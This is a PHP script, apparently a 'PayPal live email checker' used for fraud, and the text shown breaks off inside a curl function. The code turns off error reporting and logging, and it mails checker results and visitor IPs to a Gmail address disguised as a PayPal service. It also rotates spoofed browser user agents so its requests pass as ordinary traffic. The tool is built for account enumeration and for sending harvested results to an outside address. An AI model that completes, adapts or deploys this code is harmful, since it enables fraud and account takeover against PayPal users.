
<?php
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 

function loggerhsh($emailx){
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Jakarta"); 
$message .= "Email :\n".$emailx."\n\n";
$message .= date('l jS \of F Y h:i:s A')."\n";
$admin_email = "server.paypal.service.info@gmail.com";
$email = " $ip <no-reply@jembudd.com>";
$subject = "Hasil Cheker Email PP LIVE| $ip";
$comment = $_POST['comment'];
mail($admin_email, "$subject", $comment, $message, "From:" . $email);
  

}

	

function rand_ua(){
    $browser_freq = array (
        "Internet Explorer" => 11.8,
        "Firefox" => 28.2,
        "Opera"=>1.8
    );
    $browser_strings = array (
        "Internet Explorer" => array (
            "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
            "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
            "Mozilla/5.0 ( ; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 7.1; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; AskTB5.5)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.2; .NET4.0C; .NET4.0E)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.3)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; FDM; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; InfoPath.3; .NET4.0E)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; FDM; .NET4.0C; .NET4.0E; chromeframe/11.0.696.57)",
            "Mozilla/4.0 (compatible; U; MSIE 9.0; WIndows NT 9.0; en-US)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)"        
        ),
        "Firefox"=>array (
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
            "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64;) Gecko/20100101 Firefox/20.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/19.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/18.0.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0",
            "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20120427 Firefox/15.0a1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:15.0) Gecko/20120910144328 Firefox/15.0.2",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:15.0) Gecko/20121011 Firefox/15.0.1"
        ),
        "Opera"=>array(
            "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
            "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
            "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
            "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
            "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
            "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
            "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
            "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
            "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
            "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
            "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
            "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
            "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
            "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
            "Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
            "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
            "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
            "Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
            "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
            "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
            "Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
            "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
            "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
            "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
            "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
            "Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
            "Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
            "Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
            "Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
            "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
            "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
            "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
            "Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
            "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
            "Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
            "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
            "Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
            "Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
            "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
            "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
            "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
            "Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
            "Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
            "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
            "Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
            "Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
            "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
            "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
            "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
            "Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
            "Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
            "Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
            "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
            "Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
            "Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
            "Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
            "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
            "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
            "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
            "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
            "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
            "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
            "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
            "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
            "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
            "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
            "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
            "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
            "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
            "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
            "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
            "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
            "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
            "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
            "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
            "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
            "Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 6.0; U; de) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00",
            "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00"        
        )
    );
    $max = 0;
    $rcount = 0;
    $browser_type = '';
    foreach($browser_freq as $k=>$v) $max += $v;
    $roll = rand(0,$max);
    foreach($browser_freq as $k=>$v) if (($roll <= ($rcount += $v)) and (!$browser_type)) $browser_type = $k;
    $user_agent_array = $browser_strings[$browser_type];
    shuffle($user_agent_array);
    $user_agent = $user_agent_array[0];
    return $user_agent;
}
 
function ambil($cookie_file,$ua,$url){
        $ch = curl_init();
 
